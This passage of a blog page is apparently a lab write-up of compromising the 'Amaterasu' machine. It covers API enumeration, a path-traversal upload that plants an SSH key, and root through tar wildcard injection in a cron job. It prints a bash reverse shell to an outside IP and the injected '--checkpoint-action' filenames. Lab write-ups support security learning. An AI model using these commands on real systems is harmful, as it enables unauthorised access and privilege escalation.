+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">Method</span><span class="err">:</span>                  <span class="n">GET</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">Threads</span><span class="err">:</span>                 <span class="mf">10</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">Wordlist</span><span class="err">:</span>                <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">dirbuster</span><span class="p">/</span><span class="nb">directory-list</span><span class="p">-</span><span class="mf">2.3</span><span class="n">-small</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">Negative</span> <span class="n">Status</span> <span class="n">codes</span><span class="err">:</span>   <span class="mf">404</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">User</span> <span class="n">Agent</span><span class="err">:</span>              <span class="n">gobuster</span><span class="p">/</span><span class="mf">3.5</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">Timeout</span><span class="err">:</span>                 <span class="n">10s</span>
+</span></span><span class="line"><span class="cl"><span class="p">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2024</span><span class="p">/</span><span class="mf">01</span><span class="p">/</span><span class="mf">01</span> <span class="mf">19</span><span class="err">:</span><span class="mf">04</span><span class="err">:</span><span class="mf">35</span> <span class="n">Starting</span> <span class="n">gobuster</span> <span class="k">in</span> <span class="n">directory</span> <span class="n">enumeration</span> <span class="n">mode</span>
+</span></span><span class="line"><span class="cl"><span class="p">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">images</span>               <span class="p">(</span><span class="n">Status</span><span class="err">:</span> <span class="mf">301</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="err">:</span> <span class="mf">244</span><span class="p">]</span> <span class="p">[--&gt;</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">192.168</span><span class="p">.</span><span class="py">162</span><span class="p">.</span><span class="mf">249</span><span class="err">:</span><span class="mf">40080</span><span class="p">/</span><span class="n">images</span><span class="p">/]</span>
+</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">styles</span>               <span class="p">(</span><span class="n">Status</span><span class="err">:</span> <span class="mf">301</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="err">:</span> <span class="mf">244</span><span class="p">]</span> <span class="p">[--&gt;</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">192.168</span><span class="p">.</span><span class="py">162</span><span class="p">.</span><span class="mf">249</span><span class="err">:</span><span class="mf">40080</span><span class="p">/</span><span class="n">styles</span><span class="p">/]</span>
+</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">LICENSE</span>              <span class="p">(</span><span class="n">Status</span><span class="err">:</span> <span class="mf">200</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="err">:</span> <span class="mf">6555</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">Progress</span><span class="err">:</span> <span class="mf">87644</span> <span class="p">/</span> <span class="mf">87665</span> <span class="p">(</span><span class="mf">99.98</span><span class="p">%)</span>
+</span></span><span class="line"><span class="cl"><span class="p">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2024</span><span class="p">/</span><span class="mf">01</span><span class="p">/</span><span class="mf">01</span> <span class="mf">19</span><span class="err">:</span><span class="mf">11</span><span class="err">:</span><span class="mf">47</span> <span class="n">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="p">===============================================================</span>
+</span></span></code></pre></div><p>Nothing interesting here.</p>
+<h2 id="gobuster-on-33414">Gobuster on 33414</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="err">──</span><span class="p">(</span><span class="n">root</span><span class="err">💀</span><span class="n">kali</span><span class="p">)-[~/</span><span class="n">amaterasu2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="c"># gobuster dir -u http://192.168.162.249:33414/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  </span>
+</span></span><span class="line"><span class="cl"><span class="p">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Gobuster</span> <span class="n">v3</span><span class="p">.</span><span class="py">5</span>
+</span></span><span class="line"><span class="cl"><span class="n">by</span> <span class="n">OJ</span> <span class="n">Reeves</span> <span class="p">(</span><span class="nv">@TheColonial</span><span class="p">)</span> <span class="p">&amp;</span> <span class="n">Christian</span> <span class="n">Mehlmauer</span> <span class="p">(</span><span class="nv">@firefart</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">Url</span><span class="err">:</span>                     <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">192.168</span><span class="p">.</span><span class="py">162</span><span class="p">.</span><span class="mf">249</span><span class="err">:</span><span class="mf">33414</span><span class="p">/</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">Method</span><span class="err">:</span>                  <span class="n">GET</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">Threads</span><span class="err">:</span>                 <span class="mf">10</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">Wordlist</span><span class="err">:</span>                <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">dirbuster</span><span class="p">/</span><span class="nb">directory-list</span><span class="p">-</span><span class="mf">2.3</span><span class="n">-small</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">Negative</span> <span class="n">Status</span> <span class="n">codes</span><span class="err">:</span>   <span class="mf">404</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">User</span> <span class="n">Agent</span><span class="err">:</span>              <span class="n">gobuster</span><span class="p">/</span><span class="mf">3.5</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">Timeout</span><span class="err">:</span>                 <span class="n">10s</span>
+</span></span><span class="line"><span class="cl"><span class="p">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2024</span><span class="p">/</span><span class="mf">01</span><span class="p">/</span><span class="mf">01</span> <span class="mf">19</span><span class="err">:</span><span class="mf">18</span><span class="err">:</span><span class="mf">16</span> <span class="n">Starting</span> <span class="n">gobuster</span> <span class="k">in</span> <span class="n">directory</span> <span class="n">enumeration</span> <span class="n">mode</span>
+</span></span><span class="line"><span class="cl"><span class="p">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">help</span>                 <span class="p">(</span><span class="n">Status</span><span class="err">:</span> <span class="mf">200</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="err">:</span> <span class="mf">137</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">info</span>                 <span class="p">(</span><span class="n">Status</span><span class="err">:</span> <span class="mf">200</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="err">:</span> <span class="mf">98</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">Progress</span><span class="err">:</span> <span class="mf">41296</span> <span class="p">/</span> <span class="mf">87665</span> <span class="p">(</span><span class="mf">47.11</span><span class="p">%)^</span><span class="n">C</span>
+</span></span><span class="line"><span class="cl"><span class="p">[!]</span> <span class="n">Keyboard</span> <span class="n">interrupt</span> <span class="n">detected</span><span class="p">,</span> <span class="n">terminating</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2024</span><span class="p">/</span><span class="mf">01</span><span class="p">/</span><span class="mf">01</span> <span class="mf">19</span><span class="err">:</span><span class="mf">25</span><span class="err">:</span><span class="mf">01</span> <span class="n">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="p">===============================================================</span>
+</span></span></code></pre></div><p>Found some API features here.</p>
+<h2 id="enumerating-api-endpoint">Enumerating API endpoint</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">💀</span><span class="n">kali</span><span class="p">)-[~/</span><span class="n">amaterasu2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="c"># curl -X GET http://192.168.162.249:33414/help | jq .</span>
+</span></span><span class="line"><span class="cl">  <span class="p">%</span> <span class="n">Total</span>    <span class="p">%</span> <span class="n">Received</span> <span class="p">%</span> <span class="n">Xferd</span>  <span class="n">Average</span> <span class="n">Speed</span>   <span class="n">Time</span>    <span class="n">Time</span>     <span class="n">Time</span>  <span class="n">Current</span>
+</span></span><span class="line"><span class="cl">                                 <span class="n">Dload</span>  <span class="n">Upload</span>   <span class="n">Total</span>   <span class="n">Spent</span>    <span class="n">Left</span>  <span class="n">Speed</span>
+</span></span><span class="line"><span class="cl"><span class="mf">100</span>   <span class="mf">137</span>  <span class="mf">100</span>   <span class="mf">137</span>    <span class="mf">0</span>     <span class="mf">0</span>   <span class="mf">1475</span>      <span class="mf">0</span> <span class="p">--</span><span class="err">:</span><span class="p">--</span><span class="err">:</span><span class="p">--</span> <span class="p">--</span><span class="err">:</span><span class="p">--</span><span class="err">:</span><span class="p">--</span> <span class="p">--</span><span class="err">:</span><span class="p">--</span><span class="err">:</span><span class="p">--</span>  <span class="mf">1489</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;GET /info : General Info&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;GET /help : This listing&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;GET /file-list?dir=/tmp : List of the files&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;POST /file-upload : Upload files&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">💀</span><span class="n">kali</span><span class="p">)-[~/</span><span class="n">amaterasu2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="c"># curl -X GET http://192.168.162.249:33414/file-list?dir=/tmp | jq .</span>
+</span></span><span class="line"><span class="cl">  <span class="p">%</span> <span class="n">Total</span>    <span class="p">%</span> <span class="n">Received</span> <span class="p">%</span> <span class="n">Xferd</span>  <span class="n">Average</span> <span class="n">Speed</span>   <span class="n">Time</span>    <span class="n">Time</span>     <span class="n">Time</span>  <span class="n">Current</span>
+</span></span><span class="line"><span class="cl">                                 <span class="n">Dload</span>  <span class="n">Upload</span>   <span class="n">Total</span>   <span class="n">Spent</span>    <span class="n">Left</span>  <span class="n">Speed</span>
+</span></span><span class="line"><span class="cl"><span class="mf">100</span>   <span class="mf">563</span>  <span class="mf">100</span>   <span class="mf">563</span>    <span class="mf">0</span>     <span class="mf">0</span>    <span class="mf">625</span>      <span class="mf">0</span> <span class="p">--</span><span class="err">:</span><span class="p">--</span><span class="err">:</span><span class="p">--</span> <span class="p">--</span><span class="err">:</span><span class="p">--</span><span class="err">:</span><span class="p">--</span> <span class="p">--</span><span class="err">:</span><span class="p">--</span><span class="err">:</span><span class="p">--</span>   <span class="mf">624</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;flask.tar.gz&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;systemd-private-2e0fe856c0fd44ecadc327be091b8089-httpd.service-Nae0ZJ&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-logind.service-FKAUil&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;systemd-private-2e0fe856c0fd44ecadc327be091b8089-ModemManager.service-vpkdWb&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;systemd-private-2e0fe856c0fd44ecadc327be091b8089-chronyd.service-4zOGIi&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;systemd-private-2e0fe856c0fd44ecadc327be091b8089-dbus-broker.service-DeFCB5&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-resolved.service-pDGRUI&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-oomd.service-dJ9LLo&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span></code></pre></div><p>Let’s try to upload some file here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">💀</span><span class="n">kali</span><span class="p">)-[~/</span><span class="n">amaterasu2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="c"># curl -X POST http://192.168.162.249:33414/file-upload -F file=@./rev.php.txt -F filename=&#39;rev.php&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;message&#34;</span><span class="err">:</span><span class="s2">&#34;File successfully uploaded&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">                                                                                         
+</span></span><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">💀</span><span class="n">kali</span><span class="p">)-[~/</span><span class="n">amaterasu2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="c"># curl -X GET http://192.168.162.249:33414/file-list?dir=/tmp | jq .      </span>
+</span></span><span class="line"><span class="cl">  <span class="p">%</span> <span class="n">Total</span>    <span class="p">%</span> <span class="n">Received</span> <span class="p">%</span> <span class="n">Xferd</span>  <span class="n">Average</span> <span class="n">Speed</span>   <span class="n">Time</span>    <span class="n">Time</span>     <span class="n">Time</span>  <span class="n">Current</span>
+</span></span><span class="line"><span class="cl">                                 <span class="n">Dload</span>  <span class="n">Upload</span>   <span class="n">Total</span>   <span class="n">Spent</span>    <span class="n">Left</span>  <span class="n">Speed</span>
+</span></span><span class="line"><span class="cl"><span class="mf">100</span>   <span class="mf">573</span>  <span class="mf">100</span>   <span class="mf">573</span>    <span class="mf">0</span>     <span class="mf">0</span>   <span class="mf">6178</span>      <span class="mf">0</span> <span class="p">--</span><span class="err">:</span><span class="p">--</span><span class="err">:</span><span class="p">--</span> <span class="p">--</span><span class="err">:</span><span class="p">--</span><span class="err">:</span><span class="p">--</span> <span class="p">--</span><span class="err">:</span><span class="p">--</span><span class="err">:</span><span class="p">--</span>  <span class="mf">6228</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;rev.php&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;flask.tar.gz&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;systemd-private-2e0fe856c0fd44ecadc327be091b8089-httpd.service-Nae0ZJ&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-logind.service-FKAUil&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;systemd-private-2e0fe856c0fd44ecadc327be091b8089-ModemManager.service-vpkdWb&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;systemd-private-2e0fe856c0fd44ecadc327be091b8089-chronyd.service-4zOGIi&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;systemd-private-2e0fe856c0fd44ecadc327be091b8089-dbus-broker.service-DeFCB5&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-resolved.service-pDGRUI&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-oomd.service-dJ9LLo&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">💀</span><span class="n">kali</span><span class="p">)-[~/</span><span class="n">amaterasu2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="c"># curl -X GET http://192.168.162.249:33414/file-list?dir=/tmp/rev.php       </span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;!</span><span class="n">doctype</span> <span class="n">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">html</span> <span class="n">lang</span><span class="p">=</span><span class="n">en</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">title</span><span class="p">&gt;</span><span class="mf">500</span> <span class="n">Internal</span> <span class="n">Server</span> <span class="n">Error</span><span class="p">&lt;/</span><span class="n">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">h1</span><span class="p">&gt;</span><span class="n">Internal</span> <span class="n">Server</span> <span class="n">Error</span><span class="p">&lt;/</span><span class="n">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">p</span><span class="p">&gt;</span><span class="n">The</span> <span class="n">server</span> <span class="n">encountered</span> <span class="n">an</span> <span class="n">internal</span> <span class="n">error</span> <span class="n">and</span> <span class="n">was</span> <span class="n">unable</span> <span class="n">to</span> <span class="n">complete</span> <span class="n">your</span> <span class="n">request</span><span class="p">.</span> <span class="n">Either</span> <span class="n">the</span> <span class="n">server</span> <span class="n">is</span> <span class="n">overloaded</span> <span class="n">or</span> <span class="n">there</span> <span class="n">is</span> <span class="n">an</span> <span class="n">error</span> <span class="k">in</span> <span class="n">the</span> <span class="n">application</span><span class="p">.&lt;/</span><span class="n">p</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>Upload and execute php reverse shell does not work.</p>
+<h1 id="first-shell">First Shell</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">💀</span><span class="n">kali</span><span class="p">)-[~/</span><span class="n">amaterasu2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="c"># curl -X POST http://192.168.162.249:33414/file-upload -F file=@./id_rsa.pub.txt -F filename=&#39;../home/alfredo/.ssh/authorized_keys&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;message&#34;</span><span class="err">:</span><span class="s2">&#34;File successfully uploaded&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">                                                                                         
+</span></span><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">💀</span><span class="n">kali</span><span class="p">)-[~/</span><span class="n">amaterasu2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="c"># ssh alfredo@192.168.162.249 -p 25022 -i ./id_rsa</span>
+</span></span><span class="line"><span class="cl"><span class="n">Last</span> <span class="n">failed</span> <span class="n">login</span><span class="err">:</span> <span class="n">Mon</span> <span class="n">Jan</span>  <span class="mf">1</span> <span class="mf">13</span><span class="err">:</span><span class="mf">16</span><span class="err">:</span><span class="mf">13</span> <span class="n">EST</span> <span class="mf">2024</span> <span class="n">from</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">45</span><span class="p">.</span><span class="py">169</span> <span class="n">on</span> <span class="n">ssh</span><span class="err">:</span><span class="n">notty</span>
+</span></span><span class="line"><span class="cl"><span class="n">There</span> <span class="n">was</span> <span class="mf">1</span> <span class="n">failed</span> <span class="n">login</span> <span class="n">attempt</span> <span class="n">since</span> <span class="n">the</span> <span class="n">last</span> <span class="n">successful</span> <span class="n">login</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Last</span> <span class="n">login</span><span class="err">:</span> <span class="n">Tue</span> <span class="n">Mar</span> <span class="mf">28</span> <span class="mf">03</span><span class="err">:</span><span class="mf">21</span><span class="err">:</span><span class="mf">25</span> <span class="mf">2023</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">alfredo</span><span class="nv">@fedora</span> <span class="p">~]$</span> <span class="n">whoami</span>
+</span></span><span class="line"><span class="cl"><span class="n">alfredo</span>
+</span></span></code></pre></div><p>Generated ssh key and upload it as authorized_keys in some home user folder and got ssh connection.</p>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*/</span><span class="mf">1</span> <span class="p">*</span> <span class="p">*</span> <span class="p">*</span> <span class="p">*</span> <span class="n">root</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">local</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="nb">backup-flask</span><span class="p">.</span><span class="py">sh</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="n">alfredo</span><span class="nv">@fedora</span> <span class="n">restapi</span><span class="p">]$</span> <span class="nb">cat </span><span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">local</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="nb">backup-flask</span><span class="p">.</span><span class="py">sh</span> 
+</span></span><span class="line"><span class="cl"><span class="c">#!/bin/sh</span>
+</span></span><span class="line"><span class="cl"><span class="n">export</span> <span class="n">PATH</span><span class="p">=</span><span class="s2">&#34;/home/alfredo/restapi:</span><span class="nv">$PATH</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd </span><span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">alfredo</span><span class="p">/</span><span class="n">restapi</span>
+</span></span><span class="line"><span class="cl"><span class="n">tar</span> <span class="n">czf</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">flask</span><span class="p">.</span><span class="py">tar</span><span class="p">.</span><span class="py">gz</span> <span class="p">*</span>
+</span></span></code></pre></div><p>After running linPEAS.sh, I found cron job running every minute, execute some script as root user.</p>
+<p>This tar command with wild card at the end can be exploited.</p>
+<p><a href="https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c">Privilege Escalation Using Wildcard Injection | Tar Wildcard Injection |</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="n">alfredo</span><span class="nv">@fedora</span> <span class="n">restapi</span><span class="p">]$</span> <span class="nb">cat </span><span class="n">rev</span><span class="p">.</span><span class="py">sh</span>
+</span></span><span class="line"><span class="cl"><span class="c">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bash</span> <span class="n">-i</span> <span class="p">&gt;&amp;</span> <span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">tcp</span><span class="p">/</span><span class="mf">192.168</span><span class="p">.</span><span class="py">45</span><span class="p">.</span><span class="mf">169</span><span class="p">/</span><span class="mf">443</span> <span class="mf">0</span><span class="p">&gt;&amp;</span><span class="mf">1</span>
+</span></span></code></pre></div><p>Put reverse shell script in the <code>restapi</code> directory</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="n">alfredo</span><span class="nv">@fedora</span> <span class="n">restapi</span><span class="p">]$</span> <span class="nb">echo </span><span class="s2">&#34;&#34;</span> <span class="p">&gt;</span> <span class="s1">&#39;--checkpoint-action=exec=sh rev.sh&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">alfredo</span><span class="nv">@fedora</span> <span class="n">restapi</span><span class="p">]$</span> <span class="nb">echo </span><span class="s2">&#34;&#34;</span> <span class="p">&gt;</span> <span class="s2">&#34;--checkpoint=1&#34;</span>
+</span></span></code></pre></div><p>And run the commands above. These commands are registered as “tar czf /tmp/flask.tar.gz &ndash;checkpoint-action=exec=sh <a href="http://rev.sh">rev.sh</a> &ndash;checkpoint=1” when cronjob is executed.</p>
+<h1 id="root-shell">Root shell</h1>
+<p><img src="Amaterasu%208a737b17570c4996b62a570a406df97f/Screenshot_2024-01-01_at_21.01.02.png" alt="Screenshot 2024-01-01 at 21.01.02.png"></p>
+<p>Wait for 1 minute, and got root shell.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/kei5uke" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 kei5uke.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank"  rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
